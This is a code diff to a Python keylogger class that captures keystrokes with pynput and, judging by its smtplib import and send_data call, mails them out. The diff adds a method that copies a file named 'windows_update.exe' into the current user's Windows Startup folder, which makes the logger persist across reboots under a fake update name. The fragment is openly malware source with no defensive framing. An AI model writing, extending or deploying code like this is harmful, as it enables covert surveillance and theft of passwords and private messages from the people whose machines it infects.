@@ -1,6 +1,8 @@
 import pynput.keyboard
 import smtplib, ssl
 import time
+import getpass
+import shutil
 
 class Keylogger:
     
@@ -29,8 +31,10 @@ class Keylogger:
 
         self.send_data(hit_key)
 
-#
-
+    def change_dir(self, username):
+        username = getpass.getuser()
+        path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
+        shutil.move("windows_update.exe", path)
 
 
     def main(self):
